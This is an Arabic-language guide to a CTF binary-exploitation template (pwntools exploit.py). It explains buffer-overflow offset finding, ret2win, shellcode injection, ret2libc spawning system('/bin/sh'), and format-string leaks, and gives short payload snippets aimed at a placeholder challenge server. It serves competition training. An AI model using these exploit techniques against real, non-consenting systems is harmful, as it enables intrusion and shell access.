# دليل استغلال الثغرات الثنائية (Binary Exploitation / Pwn Guide)
**المجال**: اختراق الذاكرة والبرمجيات الثنائية (Pwn) | **الملف الرئيسي**: `exploit.py` | **اللغة**: بايثون 3 مع مكتبة Pwntools

---

## 1. ما هو هذا المجلد والملفات وما الغرض منها؟

مجلد `Pwn/` مجهز للتعامل مع تحديات اختراق البرامج الثنائية (ELF Executables في لينكس أو PE في ويندوز)، وخاصة ثغرات طفحان الذاكرة الوسيطة (Buffer Overflow)، واختطاف تدفق التنفيذ (Control Flow Hijacking)، وثغرات سلاسل التنسيق (Format String Exploitation).

الملف `exploit.py` تم إعداده ليكون القالب القياسي السريع الذي يمكنك استخدامه مع أي تحدي باينري في المسابقة دون الحاجة لكتابة كود الـ Socket أو التعامل مع البايتات يدوياً.

---

## 2. كيف تم بناؤه وكيف يعمل برمجياً (Under The Hood)؟

تم تصميم السكريبت ليدير دورة حياة الاستغلال بالكامل عبر المراحل التالية:
1. **التبديل المرن بين البيئات (Multi-target Dispatcher)**:
   - **الوضع المحلي (Local)**: تشغيل الملف التنفيذي كعملية محلية (`process(BINARY)`).
   - **الوضع البعيد (Remote)**: الاتصال بسيرفر المسابقة عبر المنفذ مباشرة (`remote(RHOST, RPORT)`).
   - **وضع التصحيح (GDB Debugging)**: تشغيل البرنامج وتوصيل مصحح الأخطاء GDB تلقائياً مع تنفيذ أوامر مسبقة مثل وضع Breakpoints.
2. **حساب الإزاحة التلقائي (Offset Calculation)**:
   - توليد نمط غير متكرر بـ `cyclic(200)`.
   - قراءة قيمة الـ Crash وقراءة الإزاحة فوراً بـ `cyclic_find(core.fault_addr)`.
3. **أقسام الهجمات الجاهزة (Pre-configured Attack Sections)**:
   - **ret2win**: استدعاء دالة موجودة مسبقاً تطبع الفلاج (مثل `win()` أو `print_flag()`).
   - **Shellcode Injection**: حقن أكواد أسمبلي تنفيذية وتشغيلها عندما تكون حماية NX معطلة.
   - **ret2libc (Two-stage Exploit)**:
     - *المرحلة الأولى*: تسريب عنوان دالة في الذاكرة (Memory Leak) لمعرفة قاعدة مكتبة C (`libc_base`).
     - *المرحلة الثانية*: استدعاء `system("/bin/sh")` للحصول على سطر أوامر تفاعلي.
   - **Format String Payload**: قراءة وكتابة الذاكرة بدقة عبر `fmtstr_payload()`.
4. **التحكم التفاعلي (Interactive Mode)**:
   - تحويل التحكم إلى المستخدم بـ `io.interactive()` للتعامل مع الشيل وكتابة `cat flag.txt`.

---

## 3. كيف تستخدم `exploit.py` خطوة بخطوة أثناء المسابقة؟

### الخطوة 1: ضبط مسار الباينري والسيرفر في رأس الملف
افتح `Pwn/exploit.py` وعدل الإعدادات:
```python
BINARY = "./vuln"              # مسار الملف الثنائي
LIBC   = "./libc.so.6"          # مسار الـ Libc إذا توفرت مع التحدي
RHOST  = "challenge.ctf.com"   # عنوان سيرفر المسابقة
RPORT  = 9001                  # المنفذ
```

### الخطوة 2: تشغيل السكريبت وفق الهدف

- **التجربة محلياً على جهازك**:
  ```bash
  python exploit.py
  ```

- **الاتصال بسيرفر المسابقة الحقيقي وإرسال الاستغلال**:
  ```bash
  python exploit.py REMOTE
  ```

- **التشغيل والربط التلقائي بـ GDB لفحص السجلات والـ Stack**:
  ```bash
  python exploit.py DEBUG
  ```

---

## 4. نماذج أكواد عملية جاهزة داخل السكريبت

### أ. استغلال ret2win البسيط:
```python
offset = 40  # تم إيجاده بواسطة cyclic
win_addr = elf.symbols['win']

# إضافة gadget ret لتنسيق الـ Stack في أنظمة 64-bit (16-byte alignment)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat({
    offset: [
        ret_gadget,
        win_addr
    ]
})

io.sendline(payload)
io.interactive()
```

### ب. استغلال ثغرة Format String لتسريب الفلاج من الـ Stack:
```python
# قراءة المؤشرات من الـ Stack
for i in range(1, 30):
    io = start()
    io.sendline(f"%{i}$p".encode())
    res = io.recvline().strip()
    print(f"Offset {i}: {res}")
    io.close()
```
